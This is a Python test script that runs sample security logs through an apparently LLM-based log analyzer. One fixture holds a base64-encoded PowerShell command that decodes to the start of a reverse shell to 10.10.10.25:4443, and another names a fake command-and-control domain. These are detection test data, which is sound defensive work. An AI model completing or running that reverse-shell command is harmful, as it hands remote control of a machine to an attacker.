import json
from tier3llm import analyze_log_with_llm

# A curated list of unclassified, potentially anomalous logs to test the LLM's reasoning.
# These represent the kinds of logs that would be passed up from Tier 1 and Tier 2.
TEST_LOGS = [
    {
        "description": "Unusual Internal Port Scan Behavior",
        "log_context": {
            "@timestamp": "2025-09-15T22:50:00",
            "source.ip": "192.168.1.105",
            "destination.ip": "192.168.1.201",
            "destination.port": 135,
            "event.outcome": "failure",
            "message": "Firewall block: TCP connection attempt from internal host to EPMAPPER service."
        }
    },
    {
        "description": "Suspicious PowerShell Command",
        "log_context": {
            "@timestamp": "2025-09-15T22:52:15",
            "user.name": "svc_automation",
            "process.name": "powershell.exe",
            "process.command_line": "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4AMgA1ACIALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGU ..."
        }
    },
    {
        "description": "Anomalous DNS Query",
        "log_context": {
            "@timestamp": "2025-09-15T22:55:05",
            "source.ip": "192.168.1.50",
            "query.name": "x0z1a9b2c3d4e5f6.malware-c2-domain.ru",
            "message": "DNS query for a domain with high entropy."
        }
    },
    {
        "description": "Benign but Rare Application Error",
        "log_context": {
            "@timestamp": "2025-09-15T22:58:30",
            "log.source": "application_java",
            "message": "Exception in thread 'main' java.lang.OutOfMemoryError: Java heap space"
        }
    }
]

def run_tier3_test():
    """
    Runs the Tier 3 LLM analyzer against a list of test logs and prints the results.
    """
    print("--- Starting Tier 3 Independent Test ---")
    
    for i, test_case in enumerate(TEST_LOGS):
        print("\n" + "="*50)
        print(f"[TEST CASE {i+1}]: {test_case['description']}")
        print("--- CONTEXT ---")
        print(json.dumps(test_case['log_context'], indent=2))
        
        print("\n--- LLM ANALYSIS ---")
        analysis_result = analyze_log_with_llm(test_case['log_context'])
        print(json.dumps(analysis_result, indent=2))
        print("="*50)
        
    print("\n--- Test Complete ---")

if __name__ == "__main__":
    run_tier3_test()
